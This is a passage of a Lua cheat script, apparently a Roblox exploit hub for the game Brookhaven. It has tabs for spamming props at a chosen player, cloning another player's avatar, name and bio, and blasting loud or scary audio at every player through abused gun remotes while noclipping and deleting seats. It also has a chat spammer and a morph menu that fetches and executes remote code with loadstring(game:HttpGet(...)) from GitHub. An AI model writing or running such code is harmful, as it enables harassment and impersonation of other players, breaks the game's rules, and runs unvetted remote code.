                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PROP SPAM",
        Default = false,
        Callback = function(state)
            ClearConnection("PROP SPAM")
            if state then
                activeConnections["PROP SPAM"] = task.spawn(function()
                    while true do
                        local target = FindTarget(selectedPlayerName)
                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                            local currentTarget = FindTarget(selectedPlayerName)
                            if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                                local playerPos = currentTarget.Character.HumanoidRootPart.Position
                                
                                local char = LP.Character
                                if char and char:FindFirstChild("PropMaker") and char.PropMaker:FindFirstChild("Tool_PropMake") then
                                    local argsProp = {
                                        [1] = workspace.Model.Wedge,
                                        [2] = playerPos
                                    }
                                    char.PropMaker.Tool_PropMake:FireServer(unpack(argsProp))
                                end
                            end
                        end
                        task.wait(0.8)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- TAB AVATAR
-- ==========================================
local TabAvatar = Window:MakeTab({"AVATAR", "shirt"})

-- ================= SERVICES =================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local TargetName = nil

-- ================= TEXTBOX =================
TabAvatar:AddTextBox({
    Name = "TARGET NAME",
    Description = "Enter target player name",
    PlaceholderText = "Username or Display...",
    Callback = function(Value)
        TargetName = Value
    end
})

-- ================= FUNÇÃO PARA ACHAR PLAYER =================
local function FindTarget(name)
    name = name:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():find(name) or plr.DisplayName:lower():find(name) then
            return plr
        end
    end
    return nil
end

-- ================= COPY AVATAR =================
TabAvatar:AddButton({"COPY AVATAR", function()
    if not TargetName then return end

    local TPlayer = FindTarget(TargetName)
    if not TPlayer or not TPlayer.Character then return end

    local LP = Players.LocalPlayer
    local LChar = LP.Character
    if not LChar then return end

    local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
    local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not (LHumanoid and THumanoid) then return end

    -- RESET LOCAL
    local LDesc = LHumanoid:GetAppliedDescription()
    for _, acc in ipairs(LDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.2)
        end
    end
    for _, id in ipairs({LDesc.Shirt, LDesc.Pants, LDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.2)
        end
    end

    -- COPY TARGET
    local PDesc = THumanoid:GetAppliedDescription()
    Remotes.ChangeCharacterBody:InvokeServer({
        PDesc.Torso,
        PDesc.RightArm,
        PDesc.LeftArm,
        PDesc.RightLeg,
        PDesc.LeftLeg,
        PDesc.Head
    })

    task.wait(0.5)

    for _, id in ipairs({PDesc.Shirt, PDesc.Pants, PDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.3)
        end
    end

    for _, acc in ipairs(PDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.3)
        end
    end

    local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
    if SkinColor then
        Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
    end

    if tonumber(PDesc.IdleAnimation) then
        Remotes.Wear:InvokeServer(PDesc.IdleAnimation)
    end

    -- BIO / CORES
    local Bag = TPlayer:FindFirstChild("PlayersBag")
    if Bag then
        if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
        end
        if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
        end
        if Bag:FindFirstChild("RPNameColor") then
            Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
        end
        if Bag:FindFirstChild("RPBioColor") then
            Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
        end
    end
end})

-- ================= HSV RGB COMPLETO =================

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 1

TabAvatar:AddSection({"HSV RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Name = v
	end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Bio = v
	end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Body = v
	end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle speed",
	PlaceholderText = "1",
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local hue = 0

	while true do
		task.wait(0.05)

		if RBW_Body or RBW_Name or RBW_Bio then
			hue = (hue + 0.01 * RBW_Speed) % 1

			local color = Color3.fromHSV(hue, 1, 1)
			local brick = BrickColor.new(color)

			if RBW_Body then
				Remotes.ChangeBodyColor:FireServer(brick.Name)
			end

			if RBW_Name then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPNameColor", color)
			end

			if RBW_Bio then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPBioColor", color)
			end
		end
	end
end)

-- =========================================================
-- RED BLACK WHITE RGB
-- =========================================================
local RBW_Colors = {
	Color3.fromRGB(255, 0, 0),
	Color3.fromRGB(0, 0, 0),
	Color3.fromRGB(255, 255, 255)
}

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 0.7

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

TabAvatar:AddSection({"RED BLACK RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Name = v end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Bio = v end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Body = v end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED (RBW)",
	Description = "Set the color shifting delay interval",
	PlaceholderText = tostring(RBW_Speed),
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0.05 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local i = 1
	while true do
		task.wait(RBW_Speed)
		
		if RBW_Name or RBW_Bio or RBW_Body then
			i = i % #RBW_Colors + 1
			local currentColor = RBW_Colors[i]
			
			-- Altera a cor do Nome no RP do Brookhaven
			if RBW_Name then
				pcall(function()
					ColorRemote:FireServer("PickingRPNameColor", currentColor)
				end)
			end
			
			-- Altera a cor da Bio no RP do Brookhaven
			if RBW_Bio then
				pcall(function()
					ColorRemote:FireServer("PickingRPBioColor", currentColor)
				end)
			end
			
			-- Altera a cor da skin do personagem
			if RBW_Body then
				pcall(function()
					local brick = BrickColor.new(currentColor)
					Remotes.ChangeBodyColor:FireServer(brick.Name)
				end)
			end
		end
	end
end)

-- ================= RP NAMES =================
local RoleplayNames = {
	{"ANONYMOUS"," ANONYMOUS "},
	{"PRO PLAYER"," PRO PLAYER "},
	{"ERROR 666"," ERROR 666 "},
	{"GHOST"," GHOST "},
	{"JOKER"," JOKER "},
	{"ADMIN"," ADMIN "},
	{"TUBERS 93"," TUBERS 93 "},
	{"RED BLACK MEMBER"," RED BLACK MEMBER "},
	{"RED BLACK COMMUNITY"," RED BLACK COMMUNITY "},
	{"ADMIN RED BLACK"," ADMIN RED BLACK "}
}

local selectedRP = nil

TabAvatar:AddSection({"RP Names"})

TabAvatar:AddDropdown({
	Name = "SELECT RP NAME",
	Description = "Choose an identity",
	Options = (function()
		local list = {}
		for _, v in ipairs(RoleplayNames) do
			table.insert(list, v[1])
		end
		return list
	end)(),
	Default = RoleplayNames[1][1],
	Callback = function(value)
		for _, v in ipairs(RoleplayNames) do
			if v[1] == value then
				selectedRP = v[2]
			end
		end
	end
})

TabAvatar:AddButton({"APPLY RP NAME", function()
	if not selectedRP then return end
	game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", selectedRP)
end})

-- ================= CLOTHES =================
TabAvatar:AddSection({"Clothes"})

TabAvatar:AddButton({"RED BLACK COMMUNITY SHIRT", function()
	Remotes.WearShirt:InvokeServer(101480394255855)
end})

TabAvatar:AddButton({"RED BLACK COMMUNITY PANTS", function()
	Remotes.WearPants:InvokeServer(124684324540170)
end})

-- ================= ITENS =================
TabAvatar:AddSection({"Itens"})

TabAvatar:AddButton({"SCARY HEAD", function()
	Remotes.Wear:InvokeServer(14994946752)
end})

TabAvatar:AddButton({"SCARY BRO 1", function()
	Remotes.Wear:InvokeServer(98235263954323)
end})

TabAvatar:AddButton({"SCARY BRO 2", function()
	Remotes.Wear:InvokeServer(87859729921468)
end})

TabAvatar:AddSection({"Morphs"})

local SELECTED_MORPH = nil

TabAvatar:AddDropdown({
    Name = "SELECT MORPH",
    Description = "Choose a morph to transform into",
    Options = {
        "SCP 096",
        "SCP 173",
        "SID",
        "WORM BRO",
        "TUNG TUNG TUNG SAHUR",
        "BIG GUY",
        "DOJE",
        "DUCK",
        "SQUIRREL",
        "BROWN CHICKEN",
        "GIGA CHAD",
        "KAWASAKI",
        "MIKE WAZOWSKI",
        "MONKEY",
        "PIGEON"
    },
    Default = "",
    Callback = function(Value)
        SELECTED_MORPH = Value
    end
})

TabAvatar:AddButton({"EQUIP", function()
    if not SELECTED_MORPH then return end

    if SELECTED_MORPH == "SCP 096" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20096"))()

    elseif SELECTED_MORPH == "SCP 173" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20173"))()

    elseif SELECTED_MORPH == "SID" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SID"))()

    elseif SELECTED_MORPH == "WORM BRO" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/WORM%20BRO"))()

    elseif SELECTED_MORPH == "TUNG TUNG TUNG SAHUR" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/TUNG%20TUNG%20TUNG%20SAHUR"))()

    elseif SELECTED_MORPH == "BIG GUY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/BIG%20GUY"))()

    elseif SELECTED_MORPH == "DOJE" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DOJE"))()

    elseif SELECTED_MORPH == "DUCK" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DUCK"))()

    elseif SELECTED_MORPH == "SQUIRREL" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/ESQUILO"))()

    elseif SELECTED_MORPH == "BROWN CHICKEN" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GALINHA"))()

    elseif SELECTED_MORPH == "GIGA CHAD" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GIGA%20CHAD"))()

    elseif SELECTED_MORPH == "KAWASAKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/KAVAZAKI"))()

    elseif SELECTED_MORPH == "MIKE WAZOWSKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MAIKI"))()

    elseif SELECTED_MORPH == "MONKEY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MONKEY"))()

    elseif SELECTED_MORPH == "PIGEON" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/PINGEON"))()
    end
end})

-- ================= SPECIAL ITEMS =================
do
	local SectionSpecial = TabAvatar:AddSection({"Legs & Heads"})

	local function EquipItemDirect(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- ICE LEG
	TabAvatar:AddButton({"ICE LEG", function()
		EquipItemDirect({139572789})
	end})

	-- HEADLESS
	TabAvatar:AddButton({"HEADLESS", function()
		local headlessId = 15093053680
		if headlessId ~= 0 then
			EquipItemDirect({headlessId})
		end
	end})

	-- ZOMBIE LEG
	TabAvatar:AddButton({"ZOMBIE LEG", function()
		EquipItemDirect({86681341524412})
	end})
end

-- ================= ACCESSORIES =================
do
	local SectionAccessories = TabAvatar:AddSection({"ACCESSORIES"})

	local function EquipAccessory(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- DOMINUS FRIGIDUS
	TabAvatar:AddButton({"DOMINUS FRIGIDUS", function()
		EquipAccessory({48545806})
	end})

	-- DOMINUS FORMIDULOSUS
	TabAvatar:AddButton({"DOMINUS FORMIDULOSUS", function()
		EquipAccessory({4255053867})
	end})

	-- DOMINUS PRAEFECTUS
	TabAvatar:AddButton({"DOMINUS PRAEFECTUS", function()
		EquipAccessory({527365852})
	end})

	-- DOMINUS MESSOR
	TabAvatar:AddButton({"DOMINUS MESSOR", function()
		EquipAccessory({64444871})
	end})

	-- DOMINUS VESPERTILIO
	TabAvatar:AddButton({"DOMINUS VESPERTILIO", function()
		EquipAccessory({96103379})
	end})

	-- DOMINUS REX
	TabAvatar:AddButton({"DOMINUS REX", function()
		EquipAccessory({250395631})
	end})

	-- DOMINUS EMPYREUS FVM
	TabAvatar:AddButton({"DOMINUS EMPYREUS FVM", function()
		EquipAccessory({151789690})
	end})

	-- DOMINUS AUREUS
	TabAvatar:AddButton({"DOMINUS AUREUS", function()
		EquipAccessory({138932314})
	end})

	-- DOMINUS PITTACIUM
	TabAvatar:AddButton({"DOMINUS PITTACIUM", function()
		EquipAccessory({335080779})
	end})

	-- DOMINUS INFERNUS
	TabAvatar:AddButton({"DOMINUS INFERNUS", function()
		EquipAccessory({31101391})
	end})

	-- DOMINUS EMPYREUS
	TabAvatar:AddButton({"DOMINUS EMPYREUS", function()
		EquipAccessory({21070012})
	end})

	-- PIRATE CAPTAIN HAT
	TabAvatar:AddButton({"PIRATE CAPTAIN HAT", function()
		EquipAccessory({1028859})
	end})

	-- P SINISTER
	TabAvatar:AddButton({"P SINISTER", function()
		EquipAccessory({17450053})
	end})

	-- RIDDLE SKULL
	TabAvatar:AddButton({"RIDDLE SKULL", function()
		EquipAccessory({4765718})
	end})

	-- MAD COW
	TabAvatar:AddButton({"MAD COW", function()
		EquipAccessory({14673292})
	end})

	-- CLOCKWORK FVM
	TabAvatar:AddButton({"CLOCKWORK FVM", function()
		EquipAccessory({232492903})
	end})

	-- S SINISTER
	TabAvatar:AddButton({"S SINISTER", function()
		EquipAccessory({37819478})
	end})

	-- THE EARTH
	TabAvatar:AddButton({"THE EARTH", function()
		EquipAccessory({10072631})
	end})
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local RE = ReplicatedStorage:WaitForChild("RE")

local SoundIdValue = ""
local SelectedDropdownAudio = ""

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false
local AudioAllActive = false

local BoomboxRGBEnabled = false
local BoomboxRGBSpeed = 0.5

local PresetAudios = {
    ["GET OUT"] = "17580996350",
    ["WINDOWS NOTIF"] = "2389339814",
    ["LOUD"] = "108451658708095",
    ["DIE FORTNITE"] = "72536455880966",
    ["REAL LOUD"] = "131682359704129",
    ["LIE DETECTOR"] = "117916446144888",
    ["NUKE ALARM"] = "433848566",
    ["LOOP BEEP SOUND"] = "6486261822",
    ["SCARY SOUND"] = "6516011433",
    ["SCARY SREAM"] = "111272255398192",
    ["SUS SCREAM"] = "76571808089308",
    ["NECK HURTS"] = "90409807315293",
    ["CHIKEN SCREAM"] = "81891427788694",
    ["VDSMA CARLINHOS"] = "135212564271817"
}

local DropdownOptions = {
    "GET OUT",
    "WINDOWS NOTIF",
    "LOUD",
    "DIE FORTNITE",
    "REAL LOUD",
    "LIE DETECTOR",
    "NUKE ALARM",
    "LOOP BEEP SOUND",
    "SCARY SOUND",
    "SCARY SREAM",
    "SUS SCREAM",
    "NECK HURTS",
    "CHIKEN SCREAM",
    "VDSMA CARLINHOS"
}

local function playLocalClientSound(audioId)
    task.spawn(function()
        local character = LP.Character
        if not character then return end
        local head = character:FindFirstChild("Head")
        if not head then return end
        
        local cleanID = tostring(audioId):gsub("%D", "")
        
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. cleanID
        sound.Volume = 2
        sound.Parent = head
        sound:Play()
        
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
        
        task.wait(10)
        if sound and sound.Parent then sound:Destroy() end
    end)
end

local function fireShotgunRemote(audioId)
    local character = LP.Character
    if not character then return end
    
    local shotgun = character:FindFirstChild("Shotgun") or LP.Backpack:FindFirstChild("Shotgun")
    if not shotgun then return end
    
    local handle = shotgun:FindFirstChild("Handle")
    local gunScript = shotgun:FindFirstChild("GunScript_Local")
    if not handle or not gunScript then return end
    
    local muzzle = gunScript:FindFirstChild("MuzzleEffect")
    local hitEffect = gunScript:FindFirstChild("HitEffect")
    if not muzzle or not hitEffect then return end

    local cleanID = tostring(audioId):gsub("%D", "")
    local targetAudioID = tonumber(cleanID)
    if not targetAudioID then return end

    local args = {
        workspace:WaitForChild("Model"):WaitForChild("MeshPart"),
        handle,
        vector.create(-2.700000047683716, 0.125, 0),
        vector.create(332.68603515625, 31, 400.6531982421875),
        muzzle,
        hitEffect,
        targetAudioID,
        140181997495870,
        { false },
        {
            25,
            vector.create(0.25, 0.25, 100),
            BrickColor.new(24),
            0.25,
            Enum.Material.SmoothPlastic,
            0.25
        },
        true,
        false
    }

    playLocalClientSound(targetAudioID)

    pcall(function()
        RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
    end)
end

local function runAudioAllSystem(audioIdToPlay)
    if AudioAllActive then return end
    local character = LP.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    AudioAllActive = true
    local originalCFrame = rootPart.CFrame

    local disabledSeats = {}
    for _, seat in ipairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            if seat.Disabled == false then
                seat.Disabled = true
                table.insert(disabledSeats, seat)
            end
        end
    end

    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    local targets = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(targets, p)
        end
    end

    for _, target in ipairs(targets) do
        local targetChar = target.Character
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        
        if targetRoot then
            fireShotgunRemote(audioIdToPlay)

            local startTime = os.clock()
            while os.clock() - startTime < 1 do
                if targetRoot and rootPart and LP.Character then
                    rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
                end
                RunService.Heartbeat:Wait()
            end
        end
    end

    if noclipConnection then noclipConnection:Disconnect() end
    
    for _, seat in ipairs(disabledSeats) do
        if seat and seat.Parent then
            seat.Disabled = false
        end
    end

    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.CFrame = originalCFrame
    end
    
    AudioAllActive = false
end

task.spawn(function()
    while true do
        task.wait(0.1)
        if LoopTextboxEnabled and SoundIdValue ~= "" then
            fireShotgunRemote(SoundIdValue)
            task.wait(0.4)
        end
        if LoopDropdownEnabled and SelectedDropdownAudio ~= "" then
            local id = PresetAudios[SelectedDropdownAudio]
            if id then
                fireShotgunRemote(id)
                task.wait(0.4)
            end
        end
    end
end)

local BoomboxColors = {
    Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0), Color3.fromRGB(128, 0, 128), Color3.fromRGB(255, 20, 147),
    Color3.fromRGB(139, 69, 19), Color3.fromRGB(75, 0, 130), Color3.fromRGB(0, 128, 128),
    Color3.fromRGB(192, 192, 192), Color3.fromRGB(255, 255, 255)
}

task.spawn(function()
    while true do
        task.wait(BoomboxRGBSpeed)
        if BoomboxRGBEnabled then
            local color = BoomboxColors[math.random(#BoomboxColors)]
            pcall(function()
                LP:WaitForChild("PlayerGui")
                    :WaitForChild("ToolGui")
                    :WaitForChild("ToolSettings")
                    :WaitForChild("Settings")
                    :WaitForChild("PropsColor")
                    :WaitForChild("SetColor")
                    :FireServer(color)
            end)
        end
    end
end)

local TabSound = Window:MakeTab({"SOUND FE", "volume-2"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local SoundIdValue = ""
local SelectedDropdownAudio = "GET OUT"

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false

local TextboxCooldownValue = 0.2
local DropdownCooldownValue = 0.2

local function fireSniperRemote(audioId)
    local character = LocalPlayer.Character
    if not character then return end
    
    local sniper = character:FindFirstChild("Sniper")
    if not sniper then return end

    local handle = sniper:FindFirstChild("Handle")
    local gunScript = sniper:FindFirstChild("GunScript_Local")
    
    if handle and gunScript then
        local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
        local hitEffect = gunScript:FindFirstChild("HitEffect")
        
        local cleanAudioId = tonumber(audioId) or audioId
        
        local args = {
            workspace:WaitForChild("Model"):WaitForChild("001_SpawnColor"):WaitForChild("Color2"),
            handle,
            Vector3.new(0, 0.42500001192092896, -3.299999952316284),
            Vector3.new(-3.630251884460449, 0.40000152587890625, -10.42583179473877),
            muzzleEffect,
            hitEffect,
            cleanAudioId,
            140181997495870,
            { false },
            {
                25,
                Vector3.new(0.25, 0.25, 100),
                BrickColor.new(24),
                0.25,
                Enum.Material.SmoothPlastic,
                0.25
            },
            true,
            false
        }
        
        pcall(function()
            RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
        end)
        
        task.spawn(function()
            pcall(function()
                local localSound = Instance.new("Sound")
                localSound.SoundId = "rbxassetid://" .. tostring(audioId)
                localSound.Volume = 5
                localSound.Parent = handle
                localSound:Play()
                task.wait(2)
                localSound:Destroy()
            end)
        end)
    end
end

local function runAudioAllSystem(audioId)
    if not audioId or audioId == "" then return end
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local originalCFrame = character:GetPivot()
    
    pcall(function()
        for _, desc in ipairs(workspace:GetDescendants()) do
            if desc:IsA("Seat") or desc:IsA("VehicleSeat") then
                desc:Destroy()
            end
        end
    end)
    
    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if character then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
    
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local startTime = os.clock()
                
                fireSniperRemote(audioId)
                
                while os.clock() - startTime < 1.5 and targetRoot and targetRoot.Parent and character and character.Parent do
                    pcall(function()
                        character:PivotTo(targetRoot.CFrame)
                    end)
                    RunService.Heartbeat:Wait()
                end
            end
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if character then
            character:PivotTo(originalCFrame)
        end
    end)
end

TabSound:AddSection({"Required Tools"})

TabSound:AddButton({"GET SNIPER", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Sniper")
        end)
    end)
end})

TabSound:AddButton({"GET BOOMBOX", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Boombox")
        end)
    end)
end})

TabSound:AddSection({"Boombox / FE Sound"})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue == "" then return end

    task.spawn(function()
        pcall(function()
            RE:WaitForChild("PlayerToolEvent"):FireServer(
                "ToolMusicText",
                SoundIdValue,
                nil,
                true
            )
        end)
    end)
end})

TabSound:AddToggle({
    Name = "RGB BOOMBOX",
    Default = false,
    Callback = function(state)
        BoomboxRGBEnabled = state
    end
})

TabSound:AddTextBox({
    Name = "RGB SPEED (SECONDS)",
    Description = "Adjust color changing interval",
    PlaceholderText = "0.5",
    Callback = function(value)
        local v = tonumber(value)
        if v and v > 0.05 then
            BoomboxRGBSpeed = v
        end
    end
})

TabSound:AddParagraph({"WARNING", "To play sounds using the Boombox, you must own the Sound Game Pass. You can also temporarily access it by watching an advertisement, which grants the Sound Game Pass for 10 minutes."})

TabSound:AddSection({"Custom FE Sound"})

TabSound:AddParagraph({"SNIPER REQUIREMENT WARNING", "You must have the Sniper equipped in your hand for the sounds to work. If it stays in your backpack, nothing will happen."})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter custom audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue ~= "" then
        fireSniperRemote(SoundIdValue)
    end
end})

TabSound:AddTextBox({
    Name = "LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            textboxCooldownValue = num 
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP SOUND",
    Default = false,
    Callback = function(state)
        LoopTextboxEnabled = state
        if LoopTextboxEnabled then
            task.spawn(function()
                if not textboxCooldownValue then 
                    textboxCooldownValue = 0.2 
                end
                
                while LoopTextboxEnabled and SoundIdValue ~= "" do
                    fireSniperRemote(SoundIdValue)
                    task.wait(textboxCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SoundIdValue ~= "" then
        runAudioAllSystem(SoundIdValue)
    end
end})

TabSound:AddSection({"Preset FE Sounds"})

TabSound:AddDropdown({
    Name = "SELECT PRESET AUDIO",
    Description = "Choose a preset sound effect",
    Options = DropdownOptions,
    Default = "GET OUT",
    Callback = function(selected)
        SelectedDropdownAudio = selected
    end
})

TabSound:AddButton({"PLAY PRESET SOUND", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then fireSniperRemote(id) end
    end
end})

TabSound:AddTextBox({
    Name = "PRESET LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            DropdownCooldownValue = num
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP PRESET SOUND",
    Default = false,
    Callback = function(state)
        LoopDropdownEnabled = state
        if LoopDropdownEnabled then
            task.spawn(function()
                while LoopDropdownEnabled and SelectedDropdownAudio ~= "" do
                    local id = PresetAudios[SelectedDropdownAudio]
                    if id then 
                        fireSniperRemote(id) 
                    end
                    task.wait(DropdownCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then runAudioAllSystem(id) end
    end
end})

-- TAB CHAT
do
    local TabChat = Window:MakeTab({"CHAT", "message-square"})

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TextChatService = game:GetService("TextChatService")

    local ChatMessageValue = ""
    local SpamChatEnabled = false
    local SpamCooldownValue = 0.5

    TabChat:AddSection({"Chat Spammer"})

    TabChat:AddTextBox({
        Name = "MESSAGE",
        Description = "Enter message to spam",
        PlaceholderText = "Type message here...",
        Callback = function(value)
